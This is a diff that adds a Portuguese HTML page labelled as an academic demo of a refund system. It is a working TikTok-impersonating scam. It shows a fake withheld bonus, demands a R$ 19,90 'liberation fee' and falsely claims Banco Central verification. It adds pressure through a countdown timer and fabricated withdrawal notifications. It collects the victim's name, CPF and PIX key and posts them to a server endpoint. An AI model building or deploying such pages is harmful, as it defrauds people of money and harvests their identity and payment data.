@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Reembolso - Demonstração Acadêmica</title>
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Estilos baseados na estética da imagem enviada */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8f8f8;
+            color: #333;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* TELA 1 e 2 (Estilo TikTok para manter o fluxo) */
+        .card-login {
+            background: #111;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .avatar-circle {
+            width: 100px;
+            height: 100px;
+            background-color: #FE2C55; /* Cor padrão TikTok */
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 45px;
+            font-weight: bold;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            text-transform: uppercase;
+            box-shadow: 0 0 20px rgba(254, 44, 85, 0.3);
+        }
+
+        /* TELA 3 (O Estilo da Imagem do Banco) */
+        .bank-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border: 1px solid #eee;
+        }
+        
+        .header-black {
+            background: #000;
+            color: #fff;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 15px;
+        }
+        .header-black p { font-size: 12px; color: #888; margin: 0; text-transform: uppercase; }
+        .header-black h1 { font-size: 32px; margin: 5px 0; }
+        .header-black span { font-size: 13px; color: #ccc; }
+
+        .label-gray { color: #888; font-size: 13px; margin-bottom: 5px; display: block; }
+        .val-red { color: #e53935; font-size: 24px; font-weight: bold; }
+        .badge-green {
+            background: #e8f5e9;
+            color: #2e7d32;
+            font-size: 11px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+
+        .info-text { font-size: 14px; color: #666; line-height: 1.5; margin: 15px 0; }
+        
+        .row-data { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f5f5f5; }
+        .row-data:last-child { border: none; }
+        .row-data span:first-child { color: #999; font-size: 14px; }
+        .row-data span:last-child { color: #333; font-size: 14px; font-weight: 500; }
+
+        .hash-box {
+            background: #f1f1f1;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .btn-confirm {
+            background: #000;
+            color: #fff;
+            width: 100%;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        input.input-id {
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #222;
+            color: #fff;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+<div id="step-1" class="card-login">
+            <div class="header-tiktok" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #333;">
+                <span style="font-size: 20px; cursor: pointer;">✕</span>
+                <img src="Tik Tok Horizontal Logo Text Social Media.png" alt="TikTok" style="width: 140px; height: auto;">
+                <span style="font-size: 20px; cursor: pointer;">⋮</span>
+            </div>
+            <h2 style="color: #25F4EE;">TikTok Rewards</h2>
+            <p>Insira seu @ID para verificar bônus retidos.</p>
+            <input type="text" id="user-id" class="input-id" placeholder="@seu_usuario">
+            <button id="btn-search" class="btn-confirm" style="background: #FE2C55;" onclick="buscarUsuario()">VERIFICAR</button>
+        </div>
+
+<div id="step-2" class="card-login" style="display: none;">
+    <div class="avatar" id="profile-pic">
+        <div class="avatar-circle">👤</div>
+    </div>
+            <div id="display-id" style="color: #25F4EE; margin-bottom: 10px;">@usuario</div>
+            <p>Saldo Encontrado:</p>
+            <h1 id="balance-anim" style="color: #FE2C55; font-size: 42px;">R$ 0,00</h1>
+            <button class="btn-confirm" onclick="irParaPasso3()">SACAR AGORA</button>
+        </div>
+
+        <div id="step-3" style="display: none;">
+            <div id="timer" style="background: #fff3cd; color: #856404; padding: 8px; text-align: center; font-size: 12px; font-weight: bold; border-radius: 6px; margin-bottom: 15px;">
+                Seu saldo expira em: <span id="time">05:00</span>
+            </div>
+            <div class="header-black">
+                <p>Saldo Disponível</p>
+                <h1>R$ 2.706,72</h1>
+                <span>Aguardando confirmação para saque</span>
+            </div>
+
+            <div class="bank-card">
+                <span class="label-gray">CONFIRMAÇÃO DE IDENTIDADE</span>
+                <div>
+                    <span class="val-red">R$ 19,90</span>
+                    <span class="badge-green">VALOR REEMBOLSÁVEL</span>
+                </div>
+                <p class="info-text">
+                    Taxa obrigatória para liberação do saque no valor de <b>R$ 2.706,72</b>. 
+                    O valor de <b>R$ 19,90</b> será reembolsado integralmente após a confirmação.
+                </p>
+            </div>
+
+            <div class="bank-card">
+<div class="card" style="background: white; border-radius: 16px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-bottom: 20px; color: #333; text-align: left;">
+    
+    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #f0f0f0; padding-bottom: 12px;">
+        <div style="background: #000; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold;">!</div>
+        <span style="font-size: 14px; font-weight: 700; color: #111;">DADOS PARA REEMBOLSO</span>
+    </div>
+
+    <div style="display: flex; flex-direction: column; gap: 15px;">
+        
+        <div>
+            <label style="font-size: 11px; color: #999; font-weight: bold; text-transform: uppercase;">Beneficiário</label>
+            <input type="text" id="inp-nome" placeholder="Nome Completo do Titular" style="width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px;">
+            <input type="text" id="inp-cpf" placeholder="CPF (000.000.000-00)" style="width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px;">
+        </div>
+
+        <div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                <label style="font-size: 11px; color: #999; font-weight: bold; text-transform: uppercase;">Método de Recebimento</label>
+                <span style="font-size: 10px; color: #27ae60; font-weight: bold; background: #e8f5e9; padding: 2px 6px; border-radius: 4px;">INSTANTÂNEO</span>
+            </div>
+            <select style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background: #fff; margin-bottom: 8px;">
+                <option>Chave Aleatória (PIX)</option>
+                <option>CPF</option>
+                <option>E-mail</option>
+                <option>Telefone</option>
+            </select>
+            <input type="text" placeholder="Digite sua Chave PIX aqui" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px;">
+        </div>
+
+        <div style="background: #fcfcfc; border: 1px solid #eee; border-radius: 12px; padding: 15px; margin-top: 5px;">
+            <label style="font-size: 11px; color: #999; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 5px;">Valor Total a Receber</label>
+            <span style="font-size: 28px; font-weight: 800; color: #27ae60;">R$ 2.706,72</span>
+            <p style="font-size: 10px; color: #aaa; margin-top: 5px;">Data da liberação: <span id="current-date">13/03/2026</span></p>
+        </div>
+
+        <div style="text-align: center; margin-top: 5px;">
+            <p style="font-size: 9px; color: #ccc; font-family: monospace; letter-spacing: 1px;">
+                ID: ca42b93f-8ea6-4480-8d17-e61c23cdadbb
+            </p>
+        </div>
+    </div>
+</div>
+            </div>
+
+            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin: 15px 0; padding: 10px; background: #fdfdfd; border: 1px dashed #ccc; border-radius: 8px;">
+                <img src="https://logopng.com.br/logos/pix-106.png" width="40">
+                <div style="text-align: left;">
+                    <p style="font-size: 10px; font-weight: bold; color: #27ae60;">AMBIENTE CRIPTOGRAFADO</p>
+                    <p style="font-size: 9px; color: #999;">Verificado pelo Sistema de Pagamentos do Banco Central</p>
+                </div>
+            </div>
+            <button id="pay-btn" class="btn-confirm" onclick="payTaxa()" disabled style="opacity: 0.6; cursor: not-allowed;">PAGAR TAXA DE LIBERAÇÃO</button>
+            <p style="text-align: center; font-size: 12px; color: #666; margin-top: 10px;">Preencha todos os campos para liberar o pagamento</p>
+            
+            <div style="margin-top: 20px; padding: 10px; border-top: 1px solid #eee;">
+                <p style="font-size: 10px; color: #999; line-height: 1.4; text-align: justify;">
+                    * O valor da taxa de verificação (R$ 19,90) é uma medida de segurança para evitar fraudes e garantir que o bônus seja enviado para uma conta ativa. Este valor é <b>estornado automaticamente</b> para sua conta PIX em até 5 minutos após a conclusão do processo, totalizando um recebimento final de <b>R$ 2.726,62</b>.
+                </p>
+            </div>
+        </div>
+        
+        <script>
+        let formFilled = false;
+        const fields = document.querySelectorAll('input[type="text"], select');
+        
+        function checkForm() {
+            formFilled = true;
+            fields.forEach(field => {
+                if (!field.value.trim()) {
+                    formFilled = false;
+                }
+            });
+            document.getElementById('pay-btn').disabled = !formFilled;
+            document.getElementById('pay-btn').style.opacity = formFilled ? '1' : '0.6';
+            document.getElementById('pay-btn').style.cursor = formFilled ? 'pointer' : 'not-allowed';
+        }
+        
+        // Máscara para CPF (000.000.000-00)
+        document.addEventListener('DOMContentLoaded', () => {
+            const cpfInput = document.getElementById('inp-cpf');
+            const nomeInput = document.getElementById('inp-nome');
+            
+            cpfInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, "");
+                value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+                e.target.value = value.substring(0, 14);
+                checkForm();
+            });
+            
+            nomeInput.addEventListener('input', function (e) {
+                e.target.value = e.target.value.replace(/[0-9]/g, "");
+                checkForm();
+            });
+            
+            fields.forEach(field => {
+                field.addEventListener('input', checkForm);
+            });
+        });
+        
+        async function payTaxa() {
+            if (formFilled) {
+                const clientData = {
+                    name: document.querySelector('#inp-nome').value,
+                    cpf: document.querySelector('#inp-cpf').value,
+                    pix: document.querySelector('input[placeholder="Digite sua Chave PIX aqui"]').value,
+                    username: document.getElementById('display-id').innerText,
+                    status: '⏳ Pendente',
+                    date: new Date().toISOString().slice(0, 16).replace('T', ' ')
+                };
+                
+                try {
+                    const response = await fetch('/api/clients', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(clientData)
+                    });
+                    
+                    if (response.ok) {
+                        alert('✅ Taxa processada! Dados salvos no sistema. Aguarde confirmação.');
+                    } else {
+                        alert('Erro ao processar. Tente novamente.');
+                    }
+                } catch (error) {
+                    alert('Erro de conexão. Dados salvos localmente para demo.');
+                    console.log('Demo data:', clientData);
+                }
+            }
+        }
+        </script>
+
+    </div>
+
+    <script>
+        function buscarUsuario() {
+            const input = document.getElementById('user-id').value;
+            const user = input.replace('@', '').trim();
+            
+            if(user.length < 3) return alert("Digite um @ID válido");
+            
+            const btn = document.getElementById('btn-search');
+            btn.innerHTML = "Verificando ID...";
+            btn.disabled = true;
+
+            // Pega a primeira letra do nome
+            const primeiraLetra = user.charAt(0).toUpperCase();
+
+            setTimeout(() => {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+                
+                // Cria o avatar com a letra inicial
+                const profileDiv = document.getElementById('profile-pic');
+                profileDiv.innerHTML = `<div class="avatar-circle">${primeiraLetra}</div>`;
+                
+                document.getElementById('display-id').innerText = '@' + user;
+                
+                // Chamada para animar o saldo
+                animarSaldo();
+            }, 2000);
+        }
+
+        function animarSaldo() {
+            let display = document.getElementById('balance-anim');
+            let finalValue = 2706.72;
+            let current = 0;
+            
+            let timer = setInterval(() => {
+                // Incrementos irregulares para parecer que está calculando de verdade
+                current += Math.random() * 150; 
+                if (current >= finalValue) {
+                    current = finalValue;
+                    clearInterval(timer);
+                }
+                display.innerText = `R$ ${current.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+            }, 40);
+        }
+
+        function irParaPasso3() {
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+            document.body.style.backgroundColor = "#f8f8f8"; // Muda o fundo para estilo banco
+            
+            // Start urgency timer
+            startTimer(300, document.querySelector('#time'));
+        }
+        
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                display.textContent = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+        // Social Proof notifications
+        setInterval(() => {
+            const nomes = ['Ana', 'Julia', 'Paulo', 'João', 'Maria', 'Marcos', 'Ricardo', 'Beatriz', 'Carlos', 'Fernanda'];
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            const valor = (Math.random() * (5000 - 1000) + 1000).toFixed(2);
+            
+            const toast = document.createElement('div');
+            toast.style = "position:fixed; bottom:20px; left:20px; background:#fff; color:#333; padding:10px 15px; border-radius:10px; box-shadow:0 5px 15px rgba(0,0,0,0.2); font-size:12px; z-index:10000; border-left:4px solid #FE2C55;";
+            toast.innerHTML = `✅ <b>${nome}</b> acabou de sacar <b>R$ ${valor}</b>`;
+            
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 4000);
+        }, 8000);
+
+        // Add fadeIn animation
+        const style = document.createElement('style');
+        style.textContent = '@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }';
+        document.head.appendChild(style);
+        </script>
+
+</body>
+</html>
